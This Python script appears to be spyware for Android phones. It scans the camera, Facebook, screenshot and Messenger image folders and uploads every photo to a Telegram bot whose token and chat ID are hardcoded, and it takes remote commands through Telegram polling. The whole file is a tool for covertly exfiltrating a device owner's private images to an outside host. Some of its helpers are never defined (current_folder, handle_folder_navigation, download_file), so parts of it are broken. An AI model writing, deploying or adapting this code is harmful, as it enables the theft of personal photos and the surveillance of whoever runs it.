import os
import requests
import shutil

# Replace with your bot token and chat ID
TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
CHAT_ID = '6285177516'

# Global variables
target_directory = "/storage/emulated/0/Download/Images/"
directories_to_search = [
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/DCIM/Facebook",
    "/storage/emulated/0/Pictures/Screenshots",
    "/storage/emulated/0/Pictures/Messenger"
]

# Function to send message to Telegram
def send_to_telegram(message, document=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        if document:
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            files = {'document': open(document, 'rb')}
            response = requests.post(url, files=files, data={"chat_id": CHAT_ID})
        else:
            response = requests.post(url, data=data)
        
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Function to download images from specified directories and send them to Telegram
def download_and_send_images():
    try:
        for directory in directories_to_search:
            if os.path.isdir(directory):
                for filename in os.listdir(directory):
                    if filename.lower().endswith(('.png', '.jpg')):
                        src_path = os.path.join(directory, filename)
                        send_to_telegram(f"Sending image `{filename}`...", document=src_path)
        
        return "All images have been sent to Telegram."
    except Exception as e:
        return f"Error sending images: {str(e)}"

# Function to handle Telegram bot commands
def handle_telegram_update(update):
    try:
        message = update.get('message', {}).get('text', '')
        if message:
            if message.startswith('/'):
                if message == '/download_images':
                    send_to_telegram(download_and_send_images())
                else:
                    send_to_telegram(f"Unknown command `{message}`.")
            else:
                # Handle folder and file operations
                folder_path = os.path.join(current_folder, message)
                if os.path.isdir(folder_path):
                    handle_folder_navigation(message)
                else:
                    response_message = download_file(message)
                    send_to_telegram(response_message)
    
    except Exception as e:
        send_to_telegram(f"Error in Telegram update: {str(e)}")

# Function to listen for Telegram updates
def listen_for_updates():
    last_update_id = None
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    
    while True:
        params = {'timeout': 100, 'offset': last_update_id}
        response = requests.get(url, params=params)
        updates = response.json().get('result', [])
        
        for update in updates:
            last_update_id = update['update_id'] + 1
            handle_telegram_update(update)

if __name__ == "__main__":
    send_to_telegram("Bot is starting...")
    listen_for_updates()
